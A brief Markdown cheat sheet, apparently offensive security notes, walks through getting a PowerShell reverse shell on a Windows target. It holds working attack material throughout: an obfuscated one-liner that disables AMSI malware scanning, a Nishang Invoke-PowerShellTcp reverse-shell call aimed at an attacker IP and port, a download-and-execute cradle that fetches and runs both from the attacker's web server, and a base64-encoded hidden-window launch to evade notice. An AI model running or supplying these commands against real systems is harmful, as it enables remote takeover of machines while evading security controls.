# Reverse shell trick

1. Create a webserver directory to host some files.

```
mkdir webserver
```

2\. Download Invoke-PowerShellTCP from Nishang in this directory.

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

3\. Save a amsi bypass in amsi.txt in this directory.

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

4\. Add the following to the bottom of Invoke-PowerShellTcp.ps1 so it executes the reverse shell after downloading the script and change the IP and PORT.

```
Invoke-PowershellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

5\. Create a webserver from the webserver directory

```
python3 -m http.server 8090
```

6\. Use the following download and execute cradle to create a reverse shell, change the IP:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/Invoke-PowerShellTcp2.ps1')
```

It is possible to make it a bit easier to get command execution using the following technique, need to be executed in PowerShell:

```
$str = 'powershell iex (New-Object Net.WebClient).DownloadString("http://<IP>:8090/amsi.txt"); iex (New-Object Net.WebClient).DownloadString("http://<IP>:8090/Invoke-PowerShellTcp2.ps1")'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
powershell.exe -w hidden -enc <BASE64 STRING>
```











